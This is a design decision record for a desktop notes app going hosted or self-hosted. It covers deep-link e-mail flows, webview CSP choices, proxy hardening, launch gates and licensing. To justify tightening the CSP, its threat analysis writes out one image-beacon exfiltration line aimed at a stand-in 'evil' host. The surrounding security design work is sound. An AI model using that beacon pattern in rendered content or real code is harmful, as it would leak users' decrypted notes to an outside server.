# Hosted service and desktop-only product — decision record

Status: **proposed** (open decisions are marked *Decision needed*; promotion-site hosting is deferred). Owner: project maintainer.
Written before any code changes; the work is tracked in [TODO.md](../TODO.md).

## 1. Product shape

NexusNotes is a **desktop app, and only a desktop app**. There is no mobile app, no
browser extension and no web UI as a product.

There are two ways to use it, and both use the **same installer**:

| | Hosted | Self-hosted |
|---|---|---|
| Who | Everyday users | Technical users |
| Backend | Run by the maintainer on a home server | Run by the user (Docker stack) |
| Client | Signed installer, server URL pre-filled with the maintainer's domain | The same installer, server URL changed to their own |
| Docker needed on the client | No | No (only on the server machine) |

Consequences:

- The packaged app is a **thin client**. It no longer starts Docker, a backend or a
  database. The sidecar, the backend supervisor, the per-install secrets and the
  app-owned Postgres/Redis stack (#243, #277) are removed — but **only after the
  configurable server URL works** (see §7 for the order).
- The Docker stack has **no web-UI container**. The nginx image built from `desktop/` is
  removed from the compose files; a **reverse proxy for TLS** stays and routes `/api`,
  `/ws` and `/mcp` to the services. Nothing else is published.
- The web UI stops being a product. `scripts/dev-web.sh` and the Playwright e2e suite stay
  as a **test harness only** (vite dev server in a browser); they are not documented as a
  way to use the app.
- A website, if there is one, is a **separate promotion page** with the download and the
  legal pages. It is not part of the app and holds no user data.
- Flutter and the web clipper are removed from README, architecture docs and the backlog
  (not kept as "post-1.0").
- Redis is unused by the backend (documented since #327) and can be dropped from the
  production stack.

## 2. Decision A — e-mail links without a web UI

Today the server mails `…/verify-email?token=`, `…/reset-password?token=`,
`…/confirm-deletion?token=` and `…/cancel-deletion?token=` built from `APP_BASE_URL`, which
assumes a web UI that serves those routes. Without it a link must end up in the desktop app.

Options considered:

1. **Custom scheme directly in the mail** (`nexusnotes://…`). Many mail clients do not make
   unknown schemes clickable and webmail often strips them. Rejected as the only path.
2. **HTTPS link to a tiny static "open in app" page, which redirects to the deep link.**
   Works in every mail client, and the page can say "install the app first" if the scheme
   is not registered.
3. **Codes instead of links** (user copies a code into the app). Most robust, no deep link
   needed, a worse experience.

**Recommendation: 2, with 3 as the fallback**, i.e. every mail contains both the link and the
code.

Design points:

- The static page is served by the **reverse proxy on the same host as the API** (for
  example `/open`), not by a promotion site. That keeps self-hosters independent of the
  maintainer's site and keeps `APP_BASE_URL` meaningful for every deployment.
- The token travels in the URL **fragment** (`/open#…`), never the query string, so it does
  not reach the proxy's access logs or any referrer. The page's script reads the fragment
  and builds the deep link.
- The deep link carries the **server origin** next to the token. The app must compare it
  with the configured server and ask for confirmation if it differs; otherwise a crafted
  link could make the app send a token to a foreign server.
- Registration: the `nexusnotes://` scheme through the Tauri deep-link plugin, plus the
  single-instance plugin so a link opens in the running window instead of a second one. On
  Windows the scheme is registered by the installer, so it only works for installed builds.
- "Cancel deletion" must work **without being signed in** (the token is the credential), so the
  app needs a small unauthenticated flow for it, same for "reset password".
- Two separate protections, not to be confused:
  - **The fragment** keeps the token out of requests. A browser never sends it to a server, so
    a mail scanner that pre-fetches the link (Outlook Safe Links and similar) only loads the
    static page and cannot consume a single-use token. The token is used only when the app
    itself calls the API.
  - **The `/open` headers** (`Referrer-Policy: no-referrer`, a strict CSP without external
    scripts, `Cache-Control: no-store`) prevent leaks through referrers, logs and caches. They
    do not protect against scanners.
- Tokens stay single-use and short-lived as today; the deep link does not change their
  lifetime or storage.

## 3. Decision B — where the legal pages are hosted

The Privacy Policy, Terms and Cookie/Refund pages currently live in
`desktop/public/legal/` inside the web UI bundle. Without a web UI they need a public
home, because they must be readable *before* installing and linked from every mail.

**Recommendation:** host them as **static pages on the promotion site** at stable, versioned
URLs, with the sources in the repository (moved out of `desktop/`). The app opens them in the
system browser (the in-app window from 0b29f05 can go once the pages are public). Rules:

- The sign-up form links to the URLs and keeps recording agreement and version
  (`CurrentTermsVersion`); the server tells the client which URLs apply (self-hosters point
  them at their own pages, so the URLs are server configuration, not app constants).
- Keep the template/bracket workflow from `docs/deployment.md`: nothing is published with
  placeholders, and the hosted-service pages need legal review before launch (§6).
- If there is no promotion site yet, a static page on the same reverse proxy is the stopgap.

*Decision needed (later):* where the promotion site is hosted (the registrar's hosting
package, GitHub Pages, or elsewhere). Revisit after the apps are finished. The only
requirement is that the legal pages and the download stay reachable when the home server is
down, so they must not be served from it. The legal pages belong at organisation level (the
data controller is the operator, not the product) on fixed versioned URLs. The installers and
the updater manifest should likewise not depend on the home server. The API hostname becomes
the installer's default server, so choose it once; if it ever changes, keep the old name alive
or let the updater manifest carry the new URL.

## 4. Decision C — webview CSP with a configurable server URL

`connect-src` in `tauri.conf.json` is static and currently limited to `localhost:8080`. A
server URL chosen at runtime cannot be listed in it.

| | C1. Broad `connect-src` (`https: wss:`) | C2. Requests through Rust, scoped |
|---|---|---|
| Change | Allow any HTTPS/WSS origin from the webview | Webview CSP stays `connect-src 'self' ipc:`; all API and WebSocket traffic goes through Tauri commands to the one configured origin |
| Effort | Small | Large: new transport layer for REST, uploads/downloads and the sync WebSocket; `api.ts` and `sync.ts` sit behind a transport interface |
| Security | Weakens a core defence: script injection through rendered note content could send decrypted notes to any server, which undermines the E2EE story | Closes `fetch`/WebSocket exfiltration: the webview has no network `connect-src`, and Rust only talks to the user-confirmed server |
| Test harness | Unchanged | Browser harness keeps a plain `fetch` transport behind the same interface |
| Self-hosters | Works | Works; the configured origin is stored in app data and set only through a confirmation dialog |

**C2 is only sound if `img-src https:` goes away.** The CSP currently allows remote images,
and an injected script can leak data with `new Image().src = "https://evil/?d=…"` even under
`connect-src 'self' ipc:`. The same channel lets a shared note act as a tracking pixel. So C2
includes removing `https:` from `img-src` and loading remote images only after an explicit
click, fetched through Rust or the server. Without that change C2 buys less than it promises.

**Recommendation: C2 as the end goal.** Notes hold user-authored markdown rendered in a webview, and E2EE
vaults are a headline feature, so keeping the webview off the network is worth the cost.
To keep the time-to-first-working-build short, the transport interface (step 1 of §7) lands
before the Rust implementation, and C1 (broad `https: wss:`) is **never shipped**, not even for the closed beta.

**Closed-beta interim (C0):** pin `connect-src` to the maintainer's API origin only
(`https://…` and `wss://…`) and **lock the server-URL field**. The beta runs only against the
hosted server, so the Rust layer is not needed yet and nothing is weakened. The field is
unlocked for self-hosters only once C2 works. Until then **self-hosters build the app
themselves with their own origin** (pinned in their CSP), since the field is locked in the
distributed beta build.

To verify in a spike before committing: whether the Tauri HTTP plugin's scope can be set at
runtime from Rust (if it can only be static, own commands over `reqwest` are the path), how
WebSocket frames and upload streaming behave across the IPC boundary, and the Origin the
server sees (CORS/WS-Origin checks must accept the Tauri origin `http://tauri.localhost` on
Windows, or a missing Origin from Rust, then the allowlist logic needs an explicit case).

*Decided:* C2 is the end goal; C0 (pinned origin, locked field) for the closed beta.

## 5. Reverse proxy and what is exposed

- Terminates TLS (`wss://` requires it) and forwards `/api` and `/ws`; also serves the
  static `/open` page from Decision A.
- `/mcp` is routed on self-hosted stacks but **not exposed on the hosted instance during the
  closed beta**: MCP tokens have scopes and an audit log, but it is extra attack surface on a
  home server that the beta does not need.
- `/metrics`, `/ready` and the admin endpoint are not routed publicly; `/health` may be, for the
  app's version check.
- `TRUSTED_PROXIES` must name the proxy (or tunnel), or the rate limiter sees one client.
- Basic hardening of the home server: a host firewall that allows only the proxy or tunnel,
  automatic OS security updates, and nothing else reachable from the internet (Postgres,
  MinIO, search, metrics and the admin endpoint stay on the internal network), key-only or
  closed SSH, a low-privilege service user and disk encryption.
- Reachability for the hosted instance: a tunnel (no open router ports, home IP hidden) or a
  port-forwarded proxy. Check the ISP's terms for servers on a home connection first.

## 6. Decision D — go/no-go for opening registration

**Closed beta (invite-only)** comes first, with **E2EE as the default vault type**. The
backend gets an invite mechanism (operator creates invites; registration requires one) before
any external user signs up.

Registration may be opened beyond invited users only when **all** of these hold:

1. **Backups:** automated, encrypted, stored off the home server, and a **restore has been
   performed and timed** from a clean machine. `DATA_ENCRYPTION_KEY` (and old keys) are kept
   separately from the backups and the key's loss/recovery has been rehearsed.
2. **Quotas:** per-account limits on storage, vaults and attachments are enforced and
   documented; abuse can be handled without touching the host (revoke/ban an account).
3. **Legal review:** Privacy Policy, Terms, retention and deletion handling reviewed by a
   professional, including **who the data controller is** (the policies must name a real
   person or registered business; a paid plan or the refund policy may require a business
   status); a data-breach procedure and a data-subject-request procedure exist.
4. **E-mail:** a transactional mail provider (not the home connection) sending from the
   service's own domain with SPF, DKIM and DMARC set, so verification is enforced and mails
   do not land in spam, and the deep-link flows from Decision A work end to end.
5. **Installer:** signed (no SmartScreen warning) with the Tauri updater working, and the
   app/server version-skew policy is written down (how long an old client keeps working).
6. **Availability:** offline queue and local cache (#227) shipped, so a server outage or a
   powered-off home PC does not lock people out of their notes. Monitoring and an alert path
   exist.
7. **Closed beta ran** for an agreed period without data loss and with at least one real
   upgrade of the server.

## 7. Order of work

1. **Docs and backlog** (this branch): this record, README/architecture/deployment/security
   updates, TODO.md groups with issues.
2. **Server URL, closed-beta form** (`feature/server-url`): the maintainer's domain as the
   default, `connect-src` pinned to it, field locked, Origin handling for the Tauri origin,
   version check against the configured server. Enough for the closed beta.
   **Rust transport** (`feature/rust-transport`): transport interface, Rust REST and
   WebSocket layer, remote images only on click, `img-src https:` removed (Decision C2);
   then unlock the server field for self-hosters.
3. **Deep links** (`feature/email-deep-links`): Decision A, including unauthenticated reset and
   cancel-deletion flows.
4. **Remove the sidecar** (`refactor/remove-sidecar`): only once step 2 works end to end;
   removes the supervisor, per-install secrets, `docker-compose.app.yml` and the
   `docker-compose.yml` web container; the dev scripts remain the development path.
5. **Public hosting** (`feature/public-hosting`): proxy/tunnel, invite-only registration,
   quotas, backups, SMTP.
6. **Offline support** (`feature/offline-support`, #227) — moved up from "nice to have".
7. **Release pipeline** (`feature/release-pipeline`): signing, updater. **Start the
   code-signing certificate application early**: identity validation takes calendar time and
   must not wait for this step.
8. **Legal and launch** (`docs/legal-launch`): review, hosting of the pages, go/no-go check.

Steps 5–7 can overlap; the go/no-go list in §6 is the gate for leaving the closed beta.

## 8. Risks

- **Availability:** a home server is a single point of failure for every hosted user.
- **Liability:** as host of non-E2EE vaults the operator can read user data and is the data
  controller; E2EE as the default narrows but does not remove that.
- **Abuse:** open registration lets anyone consume home bandwidth and disk; hence invite-only.
- **Key custody:** losing `DATA_ENCRYPTION_KEY` makes all hosted data unrecoverable.
- **Version skew:** old installers talking to a newer server; mitigated by the version check
  and a stated support window.

## 9. Ownership and licensing

The maintainer wrote NexusNotes and keeps all rights. Self-hosters and developers may run and
modify the code, but may not resell it or present it as their own version. This is a
**product principle**, not only a licence detail: it applies to the app, the server code, the
name and the logo.

### Where the repository stands (verified against `LICENSE`, `README.md`, `CONTRIBUTING.md`)

- The code is **source-available under the PolyForm Shield License 1.0.0**, not open source.
  Any purpose is allowed except providing a product that competes with NexusNotes; a resold
  copy, a rebranded fork offered to others or a competing hosted service all fall under that
  ban. Using or modifying it for yourself or inside a company is allowed. The notice lines
  (`Required Notice`) must be kept in every copy.
- Contributions are accepted under the same terms, and the maintainer may offer them under
  other terms later (CONTRIBUTING.md).

### Gaps against the stated intent

**Decided (2026-10-05):** PolyForm Shield stays the baseline: it already bans competing products,
free or sold, and replacing it with a custom licence would lose a lawyer-written text. The
effort goes into a branding policy, a plain README explanation for self-hosters, a
third-party licence list and a contribution model. The rights holder is the maintainer
personally for now, written as `Copyright (c) 2026 [full name], Tombomeke Studios`; if a
company is founded later, the copyright is assigned to it in writing, which needs a **CLA**
(not only a DCO) so that contributions can be relicensed. No outside merges to the core until
that model exists.

1. **Name and logo.** The licence text has no trademark rule, so it does not stop a fork from
   calling itself "NexusNotes" or reusing the logo. A short branding policy is needed: forks
   must rename and must not suggest they are the official app. `docs/brand.md` is the place to
   start. Whether to register the name as a trademark is a question for legal review.
2. **Who holds the rights.** The notice names "Tombomeke Studios", which is not a legal person
   at the moment. The notice, the Terms and the Privacy Policy need a real rights holder (the
   maintainer as a natural person, or a registered business). Same question as the data
   controller in §6.
3. **Contributor rights.** Contributors keep the copyright in their changes and merely license
   them. For "I keep all rights" to hold for the whole code base, the project needs either a
   contributor licence agreement (assignment or broad licence) or, as a lighter step, a DCO
   sign-off plus the relicensing sentence already in CONTRIBUTING.md. Until decided, consider
   not merging outside contributions to core code.
4. **What self-hosters may do is not spelled out.** Running it for yourself or your own team is
   fine; running it as a service for third parties is the competing case. Say this in the README
   in plain words next to the licence summary.
5. **Distributed binaries.** The installer bundles third-party components with their own
   licences. Ship a third-party licence list with the installer; "all rights" covers only the
   maintainer's own code.
6. **Hosted-service terms.** The Terms of Service for the hosted instance are separate from the
   source licence and must not contradict it.

### Questions for the legal review

- **AI-generated code:** how much copyright rests on code largely written with an AI assistant
  (authorship needs human creative input in the EU; direction, architecture and review count),
  and what that means for the claim to hold all rights and for any dual licensing.
- **Timing:** a licence cannot be tightened for copies that already exist, and the repository is
  public. Decide the licence, branding policy and contribution model **before** forks or
  outside contributions appear.

None of this is legal advice; the licence text and a professional review decide. Whether
PolyForm Shield is the right licence for the stated intent, or whether a stricter source-available
or custom licence is needed (for example one that forbids redistribution of modified builds
altogether), is a decision for the legal review, not for this record.
